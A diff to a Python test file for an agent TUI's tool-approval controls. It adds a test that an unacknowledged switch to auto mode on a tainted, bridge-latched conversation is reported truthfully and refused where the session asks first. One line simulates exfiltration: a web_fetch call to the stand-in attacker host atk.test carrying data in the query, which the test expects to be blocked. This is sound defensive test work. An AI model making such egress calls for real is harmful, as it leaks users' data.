@@ -18,6 +18,7 @@ import pytest
 
 from local_operator.paths import CONFIG_DIR_ENV
 from local_operator.tui.app import OperatorApp
+from local_operator.tui.widgets.transcript import NoticeKind
 from tests.unit.tui.test_app_pilot import _factory
 from tests.unit.tui.test_approvals_ux import GatedSession, _boot, _gate, _wait_prompt
 
@@ -531,7 +532,13 @@ async def test_s1_a_routed_bare_default_cannot_promote_a_session_auto_to_the_mac
 
 def _approvals_report(app: OperatorApp) -> str:
     lines: list[str] = []
-    app._cmd_approvals("", lambda text, *_args, **_kw: lines.append(text))
+
+    # A def, not a lambda: ``NoticeFn`` is a Protocol with a defaulted
+    # ``kind``, which a ``*args`` lambda does not satisfy for pyright.
+    def notice(body: str, kind: NoticeKind = "info") -> None:
+        lines.append(body)
+
+    app._cmd_approvals("", notice)
     assert lines, "/approvals printed nothing"
     return lines[0]
 
@@ -593,3 +600,62 @@ async def test_3928_tui_negative_control_latched_ask_still_prompts(
         assert _approvals_report(app).startswith("tool approvals: ask")
         await pilot.press("n")
         assert await tainted is False
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize(
+    ("auto", "scope"),
+    [
+        (True, "session"),  # its own session auto
+        (True, "global"),  # riding the machine default
+        (False, "session"),  # the negative control: ask->auto stays refused
+    ],
+)
+async def test_4080_d2_tui_owner_answers_an_unacked_auto_by_the_mode_in_effect(
+    config_dir: Path, auto: bool, scope: str
+) -> None:
+    """Design r1 D2 on #4080, on the TUI-hosted owner's real routed path
+    (``TuiSessionHandle.run_slash_authoritative``): an unacked ``auto`` to a
+    latched conversation ALREADY auto used to answer "auto is still off" while
+    every tool ran unasked. It now gets the truthful bare report and nothing is
+    written; an ask conversation is still refused and stays ask."""
+    from local_operator.config import ConfigManager
+    from local_operator.mobile.tui_handle import TuiSessionHandle
+
+    session = _LatchingSession()
+    app = OperatorApp(lambda: _factory(session))
+    async with app.run_test(size=(120, 40)) as pilot:
+        await _boot(pilot, app)
+        app._set_approve_all(auto, scope=scope)
+        session.bridge_taint_latch.mark()
+        await pilot.pause()
+        assert session.bridge_latched is True
+        scope_before = app._interaction.draft.approve_scope
+        override_before = app._explicit_approvals_mode
+        mode_before = ConfigManager(config_dir).get_config_value("tool_approval_mode")
+        records_before = _approvals_records(config_dir)
+
+        result = await TuiSessionHandle(app).run_slash_authoritative(
+            "approvals", "auto", None, may_loosen=True, bridge_ack=False
+        )
+
+        assert app._approve_all is auto
+        assert app._interaction.draft.approve_scope == scope_before
+        assert app._explicit_approvals_mode == override_before
+        assert ConfigManager(config_dir).get_config_value("tool_approval_mode") == mode_before
+        assert _approvals_records(config_dir) == records_before
+        if auto:
+            assert result["data"].get("ok") is True
+            assert result["data"].get("approval_mode") == "auto"
+            assert result["text"].startswith("tool approvals: auto")
+            assert "still off" not in result["text"]
+        else:
+            assert result["data"] == {"ok": False, "approval_reason": "bridge_latched"}
+            gate = _gate(session)
+            tainted = asyncio.ensure_future(
+                gate("web_fetch", "https://atk.test/?d=x", bridge_latched=True)
+            )
+            await _wait_prompt(pilot, app)
+            assert not tainted.done(), "a refused ask session ran egress with no card"
+            await pilot.press("n")
+            assert await tainted is False
